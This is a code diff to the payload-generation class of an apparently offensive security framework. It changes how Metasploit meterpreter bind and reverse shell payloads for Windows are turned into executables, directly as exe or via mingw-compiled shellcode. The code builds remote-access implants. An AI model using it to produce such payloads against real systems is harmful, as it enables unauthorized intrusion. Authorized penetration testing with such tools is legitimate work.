@@ -52,10 +52,16 @@ class Payload(object):
 
         # 处理RHOST及LHOST参数
         if mname.find("reverse") > 0:
-            try:
-                opts.pop('RHOST')
-            except Exception as _:
-                pass
+            if mname.find("reverse_dns") > 0:
+                try:
+                    opts.pop('LHOST')
+                except Exception as _:
+                    pass
+            else:
+                try:
+                    opts.pop('RHOST')
+                except Exception as _:
+                    pass
         elif mname.find("bind") > 0:
             try:
                 opts.pop('LHOST')
@@ -122,15 +128,33 @@ class Payload(object):
             payloadfile = os.path.join(File.tmp_dir(), filename)
             byteresult = open(payloadfile, 'rb')
         elif opts.get("Format") == "exe-src":
-            opts["Format"] = "hex"
-            result = MSFModule.run(module_type="payload", mname=mname, opts=opts)
-            if result is None:
-                context = data_return(305, Payload_MSG.get(305), {})
-                return context
-            byteresult = base64.b64decode(result.get('payload'))
-            byteresult = Payload._create_payload_by_mingw(mname=mname, shellcode=byteresult,
-                                                          template="REVERSE_HEX_BASE")
-            filename = "{}.exe".format(int(time.time()))
+            if mname in ['windows/meterpreter_bind_tcp',
+                         'windows/meterpreter_reverse_tcp',
+                         'windows/meterpreter_reverse_http',
+                         'windows/meterpreter_reverse_https',
+                         'windows/meterpreter_reverse_dns',
+                         'windows/x64/meterpreter_bind_tcp',
+                         'windows/x64/meterpreter_reverse_tcp',
+                         'windows/x64/meterpreter_reverse_http',
+                         'windows/x64/meterpreter_reverse_https',
+                         'windows/x64/meterpreter_reverse_dns']:
+                opts["Format"] = "exe"
+                result = MSFModule.run(module_type="payload", mname=mname, opts=opts)
+                if result is None:
+                    context = data_return(305, Payload_MSG.get(305), {})
+                    return context
+                byteresult = base64.b64decode(result.get('payload'))
+                filename = "{}.exe".format(int(time.time()))
+            else:
+                opts["Format"] = "hex"
+                result = MSFModule.run(module_type="payload", mname=mname, opts=opts)
+                if result is None:
+                    context = data_return(305, Payload_MSG.get(305), {})
+                    return context
+                byteresult = base64.b64decode(result.get('payload'))
+                byteresult = Payload._create_payload_by_mingw(mname=mname, shellcode=byteresult,
+                                                              template="REVERSE_HEX_BASE")
+                filename = "{}.exe".format(int(time.time()))
         elif opts.get("Format") == "exe-src-service":
             opts["Format"] = "hex"
             result = MSFModule.run(module_type="payload", mname=mname, opts=opts)
